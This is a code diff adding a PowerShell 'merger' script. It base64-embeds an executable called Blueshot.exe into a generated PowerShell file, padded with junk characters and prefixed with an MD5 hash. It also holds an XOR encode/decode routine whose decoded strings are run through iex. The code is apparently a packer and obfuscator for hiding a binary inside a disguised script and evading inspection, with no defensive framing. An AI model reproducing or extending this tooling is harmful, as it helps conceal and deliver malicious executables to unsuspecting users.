@@ -1,0 +1,83 @@
+# Mrger
+$exePath = $PSScriptRoot + "\" + "Blueshot.exe"
+$psPath = "nocomments.ps1"
+$outPath = "Blueshot.ps1"
+
+function calcMD5 {
+    param($data)
+    $md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
+    $sha = New-Object -TypeName System.Security.Cryptography.SHA512CryptoServiceProvider
+    $utf8 = New-Object -TypeName System.Text.ASCIIEncoding
+    $hash = [System.BitConverter]::ToString($md5.ComputeHash($utf8.GetBytes($data))).ToLower().Replace('-', '')
+    return $hash
+}
+
+#$exeData = Get-Content -Path $exePath -Raw 
+$exeData = [convert]::ToBase64String([io.file]::ReadAllBytes($exePath))
+#$exeData = $exeData.Replace("``", "````")
+#$exeData = $exeData.Replace("`"", "```"")
+#$exeData = $exeData.Replace("`$", "```$")
+$psData = Get-Content -Path $psPath -Raw 
+$start = "`n`$s = `"TFy!QJu ROo TNn(ROo)SLq SLq ULo+UHs UJq TNn*RPn/QPbEWS_JSWQAIJO^NBELPeHBFHT}TnALVlBLOFAkHFOuFETpHCStHAUFAgcEAelclcn^r^r\tZvYxXyT|S~Pn SPm SOn TNn ULo0ULo#ULo-WHq!WFs XDt!"
+$data = $exeData + $start + "`".ToCharArray()`n" + $psData + "¡¢£¤¥¦§¨©ª«¬­®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈ5415É1Ê781Ë68Ì1Í818181818868122ÎÏÐ121ÑÒ8Ó2Ô8Õ1Ö35×168Ø1Ù18Ú168Û15Ü1Ý12Þßàáâãäåæ788741651çèéêëìíîïðñòóôõö÷12123888odfjoasd65662188øùúûü" + $exeData.Length.ToString().PadRight(128, " ")
+
+$hash = $(calcMD5 $data)
+$data = "#" + $hash + $data
+$data | Set-Content -Path $outPath
+
+exit
+#####################################################################################################
+## Enc routine
+#####################################################################################################
+$s = "TFy!QJu ROo TNn(ROo)SLq SLq ULo+UHs UJq TNn*RPn/QPbEWS_JSWQAIJO^NBELPeHBFHT}TnALVlBLOFAkHFOuFETpHCStHAUFAgcEAelclcn^r^r\tZvYxXyT|S~Pn SPm SOn TNn ULo0ULo#ULo-WHq!WFs XDt!".ToCharArray()
+
+$enc = [System.Text.Encoding]::ASCII
+
+$s = -join $s
+function LOL {
+    param($string)
+    $LOLkey = $enc.GetBytes($s)
+
+    $byteString = $enc.GetBytes($string)
+    $LOLdData = $(for ($i = 0; $i -lt $byteString.length; ) {
+        for ($j = 0; $j -lt $LOLkey.length; $j++) {
+            $byteString[$i] -bxor $LOLkey[$j]
+            $i++
+            if ($i -ge $byteString.Length) {
+                $j = $LOLkey.length
+            }
+        }
+    })
+
+    $LOLdData = [System.Convert]::ToBase64String($LOLdData)
+    
+    return $LOLdData
+}
+
+function BAR {
+    param($string, $method)
+    $BARkey = $enc.GetBytes($s)
+
+    $string = $enc.GetString([System.Convert]::FromBase64String($string))
+
+    $byteString = $enc.GetBytes($string)
+    $BARdData = $(for ($i = 0; $i -lt $byteString.length; ) {
+        for ($j = 0; $j -lt $BARkey.length; $j++) {
+            $byteString[$i] -bxor $BARkey[$j]
+            $i++
+            if ($i -ge $byteString.Length) {
+                $j = $BARkey.length
+            }
+        }
+    })
+
+    $BARdData = $enc.GetString($BARdData)
+
+    return $BARdData
+}
+
+
+$out = $(LOL "Get-Process # -ErrorAction SilentlyContinue")
+Write-Host "iex `$(BAR `"$out`")"
+$something = "LOL"
+iex $(BAR "MSURTnFp").Replace("#", $something)
